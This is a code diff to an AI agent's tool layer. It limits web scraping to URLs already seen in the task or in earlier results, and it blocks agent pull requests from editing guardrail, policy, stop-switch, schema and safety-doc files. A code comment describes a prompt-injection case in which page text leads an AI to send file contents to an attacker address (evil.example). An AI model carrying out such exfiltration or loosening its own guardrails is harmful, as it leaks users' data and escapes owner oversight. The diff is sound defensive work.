@@ -24,7 +24,18 @@ export interface ToolEnv {
   comment: (body: string) => Promise<void>;
   /** Called when a tool is refused for a red-tier reason, so the owner sees it. */
   requestApproval: (reason: string, call: ToolCall) => Promise<void>;
+  /**
+   * Pages firecrawl.scrape may fetch: links that appeared in the task or in an earlier tool result, matched exactly.
+   * Unset = any https page. The engine always sets it (orchestrator `work`), so text in a page or issue can't make an
+   * AI send what it has read to an address of the attacker's choosing (e.g. https://evil.example/?d=<file contents>).
+   */
+  allowedUrls?: Set<string>;
   f?: Fetch;
+}
+
+/** Every http(s) link in a text, trailing punctuation removed. */
+export function urlsIn(text: string): string[] {
+  return [...String(text ?? "").matchAll(/https?:\/\/[^\s<>"'()\[\]{}`]+/g)].map((m) => m[0].replace(/[.,;:!?*_]+$/, ""));
 }
 
 const MAX_OUTPUT = 12_000;
@@ -72,6 +83,14 @@ const PROTECTED: RegExp[] = [
   /(^|\/)\.(cursorrules|windsurfrules|clinerules|roorules|goosehints)(\/|$)/i,
   /(^|\/)\.(agents|claude|codex|cursor|cline|windsurf|devin|gemini|continue|roo|kiro|amazonq|junie)(\/|$)/i,
   /(^|\/)\.aider[^/]*$/i,
+  // The guardrails themselves: an agent PR may never rewrite the code that limits agents (tiers, harm rules, budget,
+  // Stop everything, claims, provenance, review check, the approval gate and this file), the database schema, or the
+  // owner-facing safety docs. Text an AI read can't talk it into loosening them; a person changes these by hand.
+  /^src\/(policy|tools|budget|config|stop-switch|claims|provenance|review-check|identity|orchestrator)\.ts$/i,
+  /^api\/_lib\/(workspace-rules|workspace-actions|workspace-memory|workspace-connectors|workspace-plugins|site-auth)\.js$/i,
+  /^api\/workspace\.js$/i,
+  /^db(\/|$)/i,
+  /^docs\/(CODE-OF-CONDUCT|GOVERNANCE)\.md$/i,
 ];
 
 /** A plain relative path: no empty, ".", ".." or dot/space-terminated segments (".." would climb out of the API path). */
@@ -94,7 +113,7 @@ export function prBranch(v: unknown): string {
 
 export function prPath(v: unknown): string {
   const p = plainPath(v, "File");
-  if (PROTECTED.some((re) => re.test(p))) throw new Error(`File path "${p}" is protected: agents may not change CI, ownership, git, install-time, secret or agent-instruction files`);
+  if (PROTECTED.some((re) => re.test(p))) throw new Error(`File path "${p}" is protected: agents may not change CI, ownership, git, install-time, secret, agent-instruction or safety-guardrail files`);
   return p;
 }
 
@@ -225,6 +244,9 @@ const HANDLERS: Record<string, (input: Record<string, unknown>, env: ToolEnv) =>
   async "firecrawl.scrape"(input, env) {
     const url = str(input, "url");
     if (!/^https:\/\//.test(url)) throw new Error("Only https URLs may be scraped");
+    if (env.allowedUrls && !env.allowedUrls.has(url)) {
+      throw new Error("Only links that appeared in the task or in an earlier search or page may be fetched; this one did not");
+    }
     if (env.dryRun) return `DRY RUN: would fetch ${url}`;
     const j = await firecrawl(env, "/v2/scrape", { url, formats: ["markdown"], onlyMainContent: true });
     return j.data?.markdown ?? "";
@@ -276,7 +298,7 @@ export const TOOL_DOCS: Record<string, string> = {
 
 export async function runTool(call: ToolCall, allowed: string[], env: ToolEnv): Promise<ToolResult> {
   if (!allowed.includes(call.tool)) return { ok: false, output: `Tool ${call.tool} is not available to this agent` };
-  const handler = HANDLERS[call.tool];
+  const handler = Object.hasOwn(HANDLERS, call.tool) ? HANDLERS[call.tool] : undefined;
   if (!handler) return { ok: false, output: `Unknown tool ${call.tool}` };
   const d = decide(call.tool, call.input ?? {}, env.policy);
   if (!d.allow) {
